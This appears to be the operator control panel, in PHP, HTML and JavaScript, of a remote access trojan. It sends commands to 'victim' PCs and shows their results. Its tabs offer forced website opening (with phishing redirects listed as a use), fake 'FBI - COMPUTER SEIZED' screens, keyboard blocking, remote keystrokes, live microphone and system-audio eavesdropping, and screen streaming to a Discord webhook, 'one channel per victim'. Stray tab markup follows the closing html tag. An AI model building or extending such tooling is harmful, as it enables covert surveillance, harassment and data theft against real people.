                        <button class="btn" onclick="sendCommand('sc:openwebsite', 'https://twitter.com')">Twitter</button>
                        <button class="btn" onclick="sendCommand('sc:openwebsite', 'https://reddit.com')">Reddit</button>
                        <button class="btn" onclick="sendCommand('sc:openwebsite', 'https://pornhub.com')">👀 PornHub</button>
                    </div>
                    
                    <div style="background: rgba(10, 14, 39, 0.6); padding: 15px; border-radius: 8px; margin: 15px 0;">
                        <p style="color: #6bcf7f; margin-bottom: 10px; font-weight: bold;">💡 Use Cases</p>
                        <p style="color: #aaa; font-size: 0.9em;">
                            • Rick-roll the victim<br>
                            • Open embarrassing websites<br>
                            • Redirect to phishing pages<br>
                            • Open multiple tabs to annoy<br>
                            • Display warnings or threats
                        </p>
                    </div>
                    
                    <div class="result-box" id="result-website">Results will appear here...</div>
                </div>
            </div>
            
            <!-- ANTI-SLEEP TAB -->
            <div id="tab-antisleep" class="tab-content">
                <div class="card">
                    <h2>☕ Anti-Sleep / Keep Awake</h2>
                    <p style="color: #6bcf7f; margin-bottom: 20px;">Prevent victim's PC from sleeping or locking</p>
                    
                    <h3 style="color: #3282b8; margin-top: 20px;">🔋 Power Control</h3>
                    <div class="btn-grid">
                        <button class="btn btn-success" onclick="sendCommand('sc:preventslumber', 'start')">✅ Enable Anti-Sleep</button>
                        <button class="btn btn-danger" onclick="sendCommand('sc:preventslumber', 'stop')">❌ Disable Anti-Sleep</button>
                        <button class="btn" onclick="sendCommand('sc:preventslumber', 'status')">ℹ️ Check Status</button>
                    </div>
                    
                    <div style="background: rgba(10, 14, 39, 0.6); padding: 15px; border-radius: 8px; margin: 15px 0;">
                        <p style="color: #6bcf7f; margin-bottom: 10px; font-weight: bold;">💡 What This Does</p>
                        <p style="color: #aaa; font-size: 0.9em;">
                            • Prevents system from sleeping<br>
                            • Keeps display on (no screen timeout)<br>
                            • Disables away mode<br>
                            • Useful for long-running operations<br>
                            • Survives until explicitly disabled or PC restart
                        </p>
                    </div>
                    
                    <div style="background: rgba(255, 217, 61, 0.2); padding: 15px; border-radius: 8px; margin: 15px 0; border: 1px solid rgba(255, 217, 61, 0.3);">
                        <p style="color: #ffd93d; margin-bottom: 10px; font-weight: bold;">⚡ Use Cases</p>
                        <p style="color: #aaa; font-size: 0.9em;">
                            • Keep connection alive during surveillance<br>
                            • Prevent interruption during file transfers<br>
                            • Annoy victim by preventing sleep<br>
                            • Ensure ransomware encryption completes<br>
                            • Keep keylogger/webcam active
                        </p>
                    </div>
                    
                    <div class="result-box" id="result-antisleep">Results will appear here...</div>
                </div>
            </div>
            
            <!-- COMMAND HISTORY TAB -->
            <div id="tab-history" class="tab-content">
                <div class="card">
                    <h2>📊 Command History</h2>
                    
                    <button class="btn" onclick="window.location.href = 'control_panel.php?client_id=<?= $client_id ?>'">🔄 Refresh Now</button>
                    
                    <p style="color: #aaa; margin: 10px 0; font-size: 0.9em;">
                        📡 Auto-refresh: This page will automatically refresh every 10 seconds to show new results
                    </p>
                    
                    <div class="command-history">
                        <?php if(empty($commands)): ?>
                        <div style="text-align: center; padding: 40px; color: #aaa;">
                            <p>No commands sent yet</p>
                            <p style="font-size: 0.9em; margin-top: 10px;">Send a command from any tab to see results here</p>
                        </div>
                        <?php else: ?>
                        <?php foreach($commands as $cmd): ?>
                        <div class="command-item">
                            <div class="cmd-header">
                                <span class="cmd-type"><?= htmlspecialchars($cmd['command_type']) ?></span>
                                <span class="cmd-status status-<?= $cmd['status'] ?>"><?= strtoupper($cmd['status']) ?></span>
                            </div>
                            <div style="color: #aaa; font-size: 0.85em; margin-bottom: 5px;">
                                ⏰ <?= date('Y-m-d H:i:s', strtotime($cmd['created_at'])) ?>
                            </div>
                            <?php if($cmd['command_data']): ?>
                            <div style="background: #0a0e27; padding: 8px; border-radius: 3px; margin-bottom: 8px; font-family: monospace; font-size: 0.9em;">
                                📝 Data: <?= htmlspecialchars($cmd['command_data']) ?>
                            </div>
                            <?php endif; ?>
                            <?php if($cmd['result']): ?>
                            <div style="background: #0a0e27; padding: 8px; border-radius: 3px; font-family: monospace; font-size: 0.9em; max-height: 300px; overflow-y: auto; white-space: pre-wrap;">
                                ✅ Result:
                                <?= nl2br(htmlspecialchars($cmd['result'])) ?>
                            </div>
                            <?php else: ?>
                            <div style="background: #0a0e27; padding: 8px; border-radius: 3px; color: #ffd93d; font-size: 0.9em;">
                                ⏳ Waiting for client to execute command...
                            </div>
                            <?php endif; ?>
                        </div>
                        <?php endforeach; ?>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
            
        </div>
    </div>
    
    <script>
        // Helper function for getting element values
        function $val(id) {
            const elem = document.getElementById(id);
            return elem ? elem.value : '';
        }
        
        // Show tab
        function showTab(tabId) {
            // Hide all tabs
            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
            document.querySelectorAll('.sidebar button').forEach(btn => btn.classList.remove('active'));
            
            // Show selected tab
            document.getElementById(tabId).classList.add('active');
            event.target.classList.add('active');
            
            // Save current tab to localStorage
            localStorage.setItem('activeTab', tabId);
        }
        
        // Restore last active tab on page load
        window.addEventListener('DOMContentLoaded', function() {
            const savedTab = localStorage.getItem('activeTab');
            if(savedTab && document.getElementById(savedTab)) {
                // Hide all tabs first
                document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
                document.querySelectorAll('.sidebar button').forEach(btn => btn.classList.remove('active'));
                
                // Show saved tab
                document.getElementById(savedTab).classList.add('active');
                
                // Highlight corresponding button
                const buttons = document.querySelectorAll('.sidebar button');
                buttons.forEach(btn => {
                    if(btn.getAttribute('onclick') && btn.getAttribute('onclick').includes(savedTab)) {
                        btn.classList.add('active');
                    }
                });
            }
        });
        
        // Send command
        function sendCommand(commandType, commandData) {
            showNotification('Sending command...', 'info');
            
            // Get the current tab's result box
            const activeTab = document.querySelector('.tab-content.active');
            const resultBox = activeTab ? activeTab.querySelector('.result-box') : null;
            
            if(resultBox) {
                resultBox.innerHTML = '<div style="color: #ffd93d;">⏳ Sending command...</div>';
            }
            
            fetch('control_panel.php?client_id=<?= $client_id ?>', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'ajax_command=1&command_type=' + encodeURIComponent(commandType) + '&command_data=' + encodeURIComponent(commandData)
            })
            .then(response => response.json())
            .then(data => {
                if(data.success) {
                    // Check if this is a media command
                    const isMediaCommand = commandType.startsWith('media:');
                    
                    showNotification('✓ Command sent! Polling for result...', 'success');
                    
                    if(resultBox) {
                        if(isMediaCommand) {
                            resultBox.innerHTML = '<div style="color: #51cf66;">✓ Media command sent to client.</div>' +
                                                '<div style="color: #ffd93d; margin-top: 10px;">⏳ Media capture in progress...</div>' +
                                                '<div style="color: #aaa; margin-top: 5px; font-size: 0.9em;">Media operations may take 15-60 seconds (capturing + uploading to webhook)</div>';
                        } else {
                            resultBox.innerHTML = '<div style="color: #51cf66;">✓ Command sent to client. Waiting for response...</div><div style="color: #aaa; margin-top: 10px;">Polling for results...</div>';
                        }
                    }
                    
                    // Save current tab
                    const currentTab = document.querySelector('.tab-content.active');
                    if(currentTab) {
                        localStorage.setItem('activeTab', currentTab.id);
                    }
                    
                    // Start polling for result (check every 2 seconds)
                    if(data.command_id) {
                        pollForResult(data.command_id, resultBox);
                    }
                } else {
                    showNotification('✗ Error: ' + data.message, 'error');
                    if(resultBox) {
                        resultBox.innerHTML = '<div style="color: #ff6b6b;">✗ Error: ' + data.message + '</div>';
                    }
                }
            })
            .catch(error => {
                showNotification('✗ Network error: ' + error, 'error');
                console.error('Error:', error);
                if(resultBox) {
                    resultBox.innerHTML = '<div style="color: #ff6b6b;">✗ Network error: ' + error + '</div>';
                }
            });
        }
        
        // Poll for command result
        function pollForResult(commandId, resultBox, attempts = 0) {
            if(attempts >= 60) { // Stop after 60 attempts (120 seconds for media capture)
                if(resultBox) {
                    resultBox.innerHTML = '<div style="color: #ffd93d;">⏱️ Timeout: Client did not respond within 120 seconds.</div><div style="color: #aaa; margin-top: 10px;">Check if client is online or try again. Media operations can take longer.</div>';
                }
                return;
            }
            
            fetch('control_panel.php?client_id=<?= $client_id ?>&get_result=' + commandId)
            .then(response => response.json())
            .then(data => {
                if(data.status === 'completed' && data.result) {
                    // Result received!
                    if(resultBox) {
                        // Format the result nicely
                        let formattedResult = data.result;
                        
                        // Handle screenshots specially
                        if(formattedResult.startsWith('SCREENSHOT:')) {
                            const base64Data = formattedResult.substring(11);
                            formattedResult = '<div style="margin-bottom: 10px; color: #51cf66;">✓ Screenshot captured successfully!</div>' +
                                            '<img src="data:image/jpeg;base64,' + base64Data + '" ' +
                                            'style="max-width: 100%; border-radius: 5px; cursor: pointer;" ' +
                                            'onclick="window.open(this.src, \'_blank\')" alt="Screenshot">' +
                                            '<div style="color: #aaa; font-size: 0.9em; margin-top: 10px;">📌 Click to open full size | Right-click to save</div>';
                        } else {
                            formattedResult = '<div style="color: #51cf66; margin-bottom: 10px;">✓ Result received:</div>' +
                                            '<pre style="background: #0a0e27; padding: 10px; border-radius: 3px; white-space: pre-wrap; word-wrap: break-word; margin: 0;">' + 
                                            escapeHtml(formattedResult) + '</pre>';
                        }
                        
                        resultBox.innerHTML = formattedResult;
                    }
                    showNotification('✓ Result received!', 'success');
                } else if(data.status === 'failed') {
                    if(resultBox) {
                        resultBox.innerHTML = '<div style="color: #ff6b6b;">✗ Command failed: ' + escapeHtml(data.result || 'Unknown error') + '</div>';
                    }
                    showNotification('✗ Command failed', 'error');
                } else {
                    // Still pending, check again in 2 seconds
                    setTimeout(() => pollForResult(commandId, resultBox, attempts + 1), 2000);
                    
                    if(resultBox && attempts % 5 === 0) { // Update every 10 seconds
                        resultBox.innerHTML = '<div style="color: #51cf66;">✓ Command sent. Still waiting for client... (' + (attempts * 2) + 's)</div>';
                    }
                }
            })
            .catch(error => {
                console.error('Poll error:', error);
                // Retry on error
                setTimeout(() => pollForResult(commandId, resultBox, attempts + 1), 2000);
            });
        }
        
        // Helper to escape HTML
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        // Take screenshot function
        function takeScreenshot() {
            sendCommand('screenshot', '');
        }
        
        // Confirm dangerous action
        function confirmAction(commandType, commandData, message) {
            if(confirm(message)) {
                sendCommand(commandType, commandData);
            }
        }
        
        // Show notification
        function showNotification(message, type) {
            const notif = document.getElementById('notification');
            notif.textContent = message;
            notif.className = type === 'error' ? 'notification error' : 'notification';
            notif.style.display = 'block';
            
            setTimeout(() => {
                notif.style.display = 'none';
            }, 4000);
        }
        
        // Trolling combo functions
        function runComboFBI() {
            if(!confirm('Run FBI Combo? (Rename windows, fake update, hide windows, block keyboard)')) return;
            
            sendCommand('troll:renamewindows', 'FBI - COMPUTER SEIZED');
            setTimeout(() => sendCommand('troll:fakeupdate', ''), 1000);
            setTimeout(() => sendCommand('troll:hideallwindows', ''), 31000);
            setTimeout(() => sendCommand('troll:blockkeyboard', '15'), 32000);
            showNotification('🏛️ FBI Combo initiated!', 'success');
        }
        
        function runComboChaos() {
            if(!confirm('Run Complete Chaos? (Flip screen, crazy mouse, spam sounds, spam calc)')) return;
            
            sendCommand('troll:flipscreen', 'upsidedown');
            setTimeout(() => sendCommand('troll:crazymouse', '15'), 1000);
            setTimeout(() => sendCommand('troll:spamsounds', '20'), 2000);
            setTimeout(() => sendCommand('troll:spamcalc', '30'), 3000);
            showNotification('🔥 Complete Chaos initiated!', 'success');
        }
        
        function runComboAnnoy() {
            if(!confirm('Run Annoying Combo? (CD tray, sounds, minimize spam)')) return;
            
            sendCommand('troll:spamcdtray', '20');
            setTimeout(() => sendCommand('troll:spamsounds', '30'), 1000);
            setTimeout(() => sendCommand('troll:minimizespam', '20'), 2000);
            showNotification('😠 Annoying Combo initiated!', 'success');
        }
        
        // Remote Control helper functions
        function openURL() {
            let url = prompt('Enter URL to open on victim PC:', 'https://google.com');
            if(url) {
                // Use combo to open Run dialog, then type URL
                sendCommand('rc:combo', 'win+r');
                setTimeout(() => {
                    sendCommand('rc:type', url);
                    setTimeout(() => sendCommand('rc:presskey', 'enter'), 500);
                }, 1000);
                showNotification('🌐 Opening URL: ' + url, 'success');
            }
        }
        
        function runProgram() {
            let program = prompt('Enter program to run (e.g., cmd.exe, notepad.exe):', 'notepad.exe');
            if(program) {
                sendCommand('rc:combo', 'win+r');
                setTimeout(() => {
                    sendCommand('rc:type', program);
                    setTimeout(() => sendCommand('rc:presskey', 'enter'), 500);
                }, 1000);
                showNotification('▶️ Running: ' + program, 'success');
            }
        }
        
        function lockScreen() {
            if(!confirm('Lock the victim\'s screen?')) return;
            sendCommand('rc:combo', 'win+l');
            showNotification('🔒 Screen locked!', 'success');
        }
        
        function logoutUser() {
            if(!confirm('Log out the victim user? This will close all programs!')) return;
            sendCommand('rc:combo', 'alt+f4');
            setTimeout(() => {
                sendCommand('rc:presskey', 'down');
                setTimeout(() => {
                    sendCommand('rc:presskey', 'down');
                    setTimeout(() => sendCommand('rc:presskey', 'enter'), 200);
                }, 200);
            }, 500);
            showNotification('👋 Logging out user...', 'success');
        }
        
        // ==================== LIVE AUDIO STREAMING ====================
        let liveAudioActive = false;
        let liveAudioInterval = null;
        let audioContext = null;
        let analyser = null;
        let liveStartTime = 0;
        let timerInterval = null;
        
        function toggleLiveAudio() {
            if(!liveAudioActive) {
                startLiveAudio();
            } else {
                stopLiveAudio();
            }
        }
        
        function startLiveAudio() {
            const btn = document.getElementById('liveListenBtn');
            const controls = document.getElementById('liveAudioControls');
            const resultBox = document.getElementById('result-microphone');
            
            // Start command
            sendCommand('media:livestart', 'microphone');
            
            liveAudioActive = true;
            liveStartTime = Date.now();
            btn.textContent = '⏹️ Stop Live Listen';
            btn.className = 'btn btn-danger';
            controls.style.display = 'block';
            resultBox.innerHTML = '<div style="color: #51cf66;">✓ Live audio stream started!</div>';
            
            // Initialize audio context and visualizer
            initAudioVisualizer();
            
            // Start timer
            timerInterval = setInterval(updateLiveTimer, 1000);
            
            // Start polling for audio chunks
            liveAudioInterval = setInterval(() => {
                fetchLiveAudioChunk();
            }, 500); // Poll every 500ms for smooth streaming
            
            showNotification('🎧 Live audio streaming started!', 'success');
        }
        
        function stopLiveAudio() {
            const btn = document.getElementById('liveListenBtn');
            const controls = document.getElementById('liveAudioControls');
            const resultBox = document.getElementById('result-microphone');
            
            // Stop command
            sendCommand('media:livestop', '');
            
            liveAudioActive = false;
            btn.textContent = '🎧 Start Live Listen';
            btn.className = 'btn btn-success';
            controls.style.display = 'none';
            
            if(liveAudioInterval) {
                clearInterval(liveAudioInterval);
                liveAudioInterval = null;
            }
            
            if(timerInterval) {
                clearInterval(timerInterval);
                timerInterval = null;
            }
            
            if(audioContext) {
                audioContext.close();
                audioContext = null;
            }
            
            resultBox.innerHTML = '<div style="color: #aaa;">Live audio stream stopped.</div>';
            showNotification('⏹️ Live audio stopped', 'info');
        }
        
        function updateLiveTimer() {
            const elapsed = Math.floor((Date.now() - liveStartTime) / 1000);
            const minutes = Math.floor(elapsed / 60);
            const seconds = elapsed % 60;
            document.getElementById('liveTimer').textContent = 
                String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
        }
        
        function updateLiveVolume(value) {
            document.getElementById('volumeLabel').textContent = value + '%';
            const player = document.getElementById('liveAudioPlayer');
            if(player) {
                player.volume = value / 100;
            }
        }
        
        function fetchLiveAudioChunk() {
            fetch('control_panel.php?client_id=<?= $client_id ?>&get_live_audio=1')
            .then(response => response.json())
            .then(data => {
                if(data.success && data.audio_data) {
                    playAudioChunk(data.audio_data);
                    updateVisualizer(data.audio_level || 50);
                }
            })
            .catch(error => {
                console.error('Live audio fetch error:', error);
            });
        }
        
        function playAudioChunk(base64Audio) {
            const player = document.getElementById('liveAudioPlayer');
            player.src = 'data:audio/wav;base64,' + base64Audio;
            player.volume = document.getElementById('liveVolume').value / 100;
            player.play().catch(e => console.log('Playback error:', e));
        }
        
        function initAudioVisualizer() {
            const canvas = document.getElementById('audioVisualizer');
            const ctx = canvas.getContext('2d');
            canvas.width = canvas.offsetWidth;
            canvas.height = canvas.offsetHeight;
            
            // Simple visualizer animation
            let level = 0;
            setInterval(() => {
                ctx.fillStyle = '#0a0e27';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                // Draw bars
                const barCount = 40;
                const barWidth = canvas.width / barCount;
                
                for(let i = 0; i < barCount; i++) {
                    const height = Math.random() * canvas.height * (0.3 + level * 0.7);
                    const x = i * barWidth;
                    const y = (canvas.height - height) / 2;
                    
                    const gradient = ctx.createLinearGradient(0, y, 0, y + height);
                    gradient.addColorStop(0, '#51cf66');
                    gradient.addColorStop(0.5, '#ffd93d');
                    gradient.addColorStop(1, '#ff6b6b');
                    
                    ctx.fillStyle = gradient;
                    ctx.fillRect(x + 1, y, barWidth - 2, height);
                }
            }, 50);
        }
        
        function updateVisualizer(audioLevel) {
            // audioLevel is 0-100
            // This would update the visualizer based on actual audio data
            // For now, it's animated randomly in initAudioVisualizer
        }
        
        // ==================== LIVE SYSTEM AUDIO STREAMING ====================
        let liveSystemAudioActive = false;
        let liveSystemAudioInterval = null;
        let systemAudioContext = null;
        let systemAnalyser = null;
        let liveSystemStartTime = 0;
        let systemTimerInterval = null;
        
        function toggleLiveSystemAudio() {
            if(!liveSystemAudioActive) {
                startLiveSystemAudio();
            } else {
                stopLiveSystemAudio();
            }
        }
        
        function startLiveSystemAudio() {
            const btn = document.getElementById('liveSystemAudioBtn');
            const controls = document.getElementById('liveSystemAudioControls');
            const resultBox = document.getElementById('result-systemaudio');
            
            // Start command
            sendCommand('media:livestart', 'systemaudio');
            
            liveSystemAudioActive = true;
            liveSystemStartTime = Date.now();
            btn.textContent = '⏹️ Stop Live Listen';
            btn.className = 'btn btn-danger';
            controls.style.display = 'block';
            resultBox.innerHTML = '<div style="color: #51cf66;">✓ Live system audio stream started!</div>';
            
            // Initialize audio context and visualizer
            initSystemAudioVisualizer();
            
            // Start timer
            systemTimerInterval = setInterval(updateLiveSystemTimer, 1000);
            
            // Start polling for audio chunks
            liveSystemAudioInterval = setInterval(() => {
                fetchLiveSystemAudioChunk();
            }, 500); // Poll every 500ms for smooth streaming
            
            showNotification('🎧 Live system audio streaming started!', 'success');
        }
        
        function stopLiveSystemAudio() {
            const btn = document.getElementById('liveSystemAudioBtn');
            const controls = document.getElementById('liveSystemAudioControls');
            const resultBox = document.getElementById('result-systemaudio');
            
            // Stop command
            sendCommand('media:livestop', 'systemaudio');
            
            liveSystemAudioActive = false;
            btn.textContent = '🎧 Start Live Listen';
            btn.className = 'btn btn-success';
            controls.style.display = 'none';
            
            if(liveSystemAudioInterval) {
                clearInterval(liveSystemAudioInterval);
                liveSystemAudioInterval = null;
            }
            
            if(systemTimerInterval) {
                clearInterval(systemTimerInterval);
                systemTimerInterval = null;
            }
            
            if(systemAudioContext) {
                systemAudioContext.close();
                systemAudioContext = null;
            }
            
            resultBox.innerHTML = '<div style="color: #aaa;">Live system audio stream stopped.</div>';
            showNotification('⏹️ Live system audio stopped', 'info');
        }
        
        function updateLiveSystemTimer() {
            const elapsed = Math.floor((Date.now() - liveSystemStartTime) / 1000);
            const minutes = Math.floor(elapsed / 60);
            const seconds = elapsed % 60;
            document.getElementById('liveSystemTimer').textContent = 
                String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
        }
        
        function updateLiveSystemVolume(value) {
            document.getElementById('systemVolumeLabel').textContent = value + '%';
            const player = document.getElementById('liveSystemAudioPlayer');
            if(player) {
                player.volume = value / 100;
            }
        }
        
        function fetchLiveSystemAudioChunk() {
            fetch('control_panel.php?client_id=<?= $client_id ?>&get_live_system_audio=1')
            .then(response => response.json())
            .then(data => {
                if(data.success && data.audio_data) {
                    playSystemAudioChunk(data.audio_data);
                    updateSystemVisualizer(data.audio_level || 50);
                }
            })
            .catch(error => {
                console.error('Live system audio fetch error:', error);
            });
        }
        
        function playSystemAudioChunk(base64Audio) {
            const player = document.getElementById('liveSystemAudioPlayer');
            player.src = 'data:audio/wav;base64,' + base64Audio;
            player.volume = document.getElementById('liveSystemVolume').value / 100;
            player.play().catch(e => console.log('Playback error:', e));
        }
        
        function initSystemAudioVisualizer() {
            const canvas = document.getElementById('systemAudioVisualizer');
            const ctx = canvas.getContext('2d');
            canvas.width = canvas.offsetWidth;
            canvas.height = canvas.offsetHeight;
            
            // Simple visualizer animation with different colors for system audio
            let level = 0;
            setInterval(() => {
                ctx.fillStyle = '#0a0e27';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                // Draw bars
                const barCount = 40;
                const barWidth = canvas.width / barCount;
                
                for(let i = 0; i < barCount; i++) {
                    const height = Math.random() * canvas.height * (0.3 + level * 0.7);
                    const x = i * barWidth;
                    const y = (canvas.height - height) / 2;
                    
                    const gradient = ctx.createLinearGradient(0, y, 0, y + height);
                    gradient.addColorStop(0, '#4dabf7');
                    gradient.addColorStop(0.5, '#ffd93d');
                    gradient.addColorStop(1, '#ff6b6b');
                    
                    ctx.fillStyle = gradient;
                    ctx.fillRect(x + 1, y, barWidth - 2, height);
                }
            }, 50);
        }
        
        function updateSystemVisualizer(audioLevel) {
            // audioLevel is 0-100
            // This would update the visualizer based on actual audio data
            // For now, it's animated randomly in initSystemAudioVisualizer
        }
    </script>
</body>
</html>


            <!-- DISCORD LIVE STREAM TAB -->
            <div id="tab-discordstream" class="tab-content">
                <div class="card">
                    <h2>🎥 Discord Live Stream</h2>
                    <p style="color: #aaa; margin-bottom: 15px;">Stream victim's screen directly to your Discord channel in real-time!</p>
                    
                    <div class="form-group">
                        <label>🔗 Discord Webhook URL</label>
                        <input type="text" id="dls_webhook" placeholder="https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_TOKEN" style="font-size: 0.85em;">
                    </div>
                    
                    <div class="form-group">
                        <label>📊 Stream Quality (FPS)</label>
                        <select id="dls_fps">
                            <option value="1">1 FPS (Low bandwidth, best for mobile)</option>
                            <option value="2" selected>2 FPS (Recommended)</option>
                            <option value="3">3 FPS (High quality, more bandwidth)</option>
                        </select>
                    </div>
                    
                    <div class="btn-grid">
                        <button class="btn btn-success" onclick="sendCommand('dls:start', $val('dls_fps') + '|' + $val('dls_webhook'))">▶️ Start Stream</button>
                        <button class="btn btn-danger" onclick="sendCommand('dls:stop', '')">⏹️ Stop Stream</button>
                        <button class="btn" onclick="sendCommand('dls:status', '')">📊 Get Status</button>
                    </div>
                    
                    <div style="background: rgba(255, 217, 61, 0.1); border: 1px solid rgba(255, 217, 61, 0.3); padding: 15px; border-radius: 8px; margin-top: 20px;">
                        <h3 style="color: #ffd93d; margin-bottom: 10px;">⚡ How It Works</h3>
                        <ul style="color: #ddd; line-height: 1.8;">
                            <li>✅ Captures screenshots continuously at selected FPS</li>
                            <li>✅ Automatically uploads to your Discord webhook</li>
                            <li>✅ Images appear in your Discord channel in real-time</li>
                            <li>✅ Low resource usage - runs in background</li>
                            <li>✅ Max resolution: 1280px width (auto-scaled)</li>
                            <li>✅ JPEG compression: 60% quality</li>
                        </ul>
                    </div>
                    
                    <div style="background: rgba(102, 126, 234, 0.1); border: 1px solid rgba(102, 126, 234, 0.3); padding: 15px; border-radius: 8px; margin-top: 15px;">
                        <h3 style="color: #667eea; margin-bottom: 10px;">💡 Tips</h3>
                        <ul style="color: #ddd; line-height: 1.8;">
                            <li>🎯 Use 1 FPS for long monitoring sessions</li>
                            <li>🎯 Use 2-3 FPS when you need smoother updates</li>
                            <li>🎯 Discord has 8MB file size limit per upload</li>
                            <li>🎯 Create separate Discord channel for each victim</li>
                            <li>🎯 Stream auto-stops if webhook fails</li>
                        </ul>
                    </div>
                    
                    <div class="result-box" id="result-discordstream">Results will appear here...</div>
                </div>
            </div>

            
            <h3>🎥 Live Streaming</h3>
            <button onclick="showTab('tab-discordstream')">Discord Live Stream</button>
            
